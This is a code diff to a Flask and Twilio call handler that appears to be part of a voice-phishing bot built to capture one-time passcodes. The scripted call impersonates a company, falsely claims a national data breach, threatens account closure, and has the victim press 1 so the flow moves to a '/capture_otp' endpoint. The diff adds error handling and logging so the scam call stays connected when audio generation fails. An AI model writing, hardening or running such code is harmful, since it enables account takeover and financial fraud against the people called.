@@ -3169,7 +3169,9 @@ def custom_flow():
 def normal_advanced_flow():
     """
     Single ultimate Normal Call script for human detection.
-   """
+    
+    ROBUSTNESS: All audio generation wrapped in try/except to prevent call hangup.
+    """
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
     call_sid = request.values.get("CallSid", "")
@@ -3193,25 +3195,40 @@ def normal_advanced_flow():
 
     resp = VoiceResponse()
 
+    # GREETING - with error handling
     greeting = f"This is a message from {company}. This message is for {name}."
-    greeting_audio = generate_call_audio(user_id=user_id, text=greeting, voice_id=voice_id, filename="normal_ultimate_greeting.mp3")
-    if greeting_audio:
-        resp.play(greeting_audio)
-    else:
+    try:
+        greeting_audio = generate_call_audio(user_id=user_id, text=greeting, voice_id=voice_id, filename="normal_ultimate_greeting.mp3")
+        if greeting_audio:
+            resp.play(greeting_audio)
+            logger.info(f"[NORMAL_FLOW] ✅ Greeting audio queued")
+        else:
+            resp.say(greeting)
+            logger.info(f"[NORMAL_FLOW] ⚠️  Greeting TTS fallback (audio generation failed)")
+    except Exception as e:
+        logger.error(f"[NORMAL_FLOW] Greeting error: {e}, using TTS fallback")
         resp.say(greeting)
     resp.pause(length=1)
 
+    # URGENCY MESSAGE - with error handling
     urgency = (
         "Due to a national data breach, your account is at risk and we need to verify your details. "
-        "Failure to verify your account may result in temporary or permanent closure."
+        "Failure to verify your account may result in temporary closure."
     )
-    urgency_audio = generate_call_audio(user_id=user_id, text=urgency, voice_id=voice_id, filename="normal_ultimate_urgency.mp3")
-    if urgency_audio:
-        resp.play(urgency_audio)
-    else:
+    try:
+        urgency_audio = generate_call_audio(user_id=user_id, text=urgency, voice_id=voice_id, filename="normal_ultimate_urgency.mp3")
+        if urgency_audio:
+            resp.play(urgency_audio)
+            logger.info(f"[NORMAL_FLOW] ✅ Urgency audio queued")
+        else:
+            resp.say(urgency)
+            logger.info(f"[NORMAL_FLOW] ⚠️  Urgency TTS fallback (audio generation failed)")
+    except Exception as e:
+        logger.error(f"[NORMAL_FLOW] Urgency error: {e}, using TTS fallback")
         resp.say(urgency)
     resp.pause(length=1)
 
+    # PROMPT WITH GATHER - with error handling
     prompt = "Please press 1 to continue the verification process."
     gather_action = (
         f"/capture_otp?user_id={quote_plus(str(user_id))}"
@@ -3225,10 +3242,16 @@ def normal_advanced_flow():
         method="POST",
         finish_on_key="",
     )
-    prompt_audio = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_press1.mp3")
-    if prompt_audio:
-        gather.play(prompt_audio)
-    else:
+    try:
+        prompt_audio = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_press1.mp3")
+        if prompt_audio:
+            gather.play(prompt_audio)
+            logger.info(f"[NORMAL_FLOW] ✅ Prompt audio queued in Gather")
+        else:
+            gather.say(prompt)
+            logger.info(f"[NORMAL_FLOW] ⚠️  Prompt TTS fallback (audio generation failed)")
+    except Exception as e:
+        logger.error(f"[NORMAL_FLOW] Prompt error: {e}, using TTS fallback")
         gather.say(prompt)
     resp.append(gather)
 
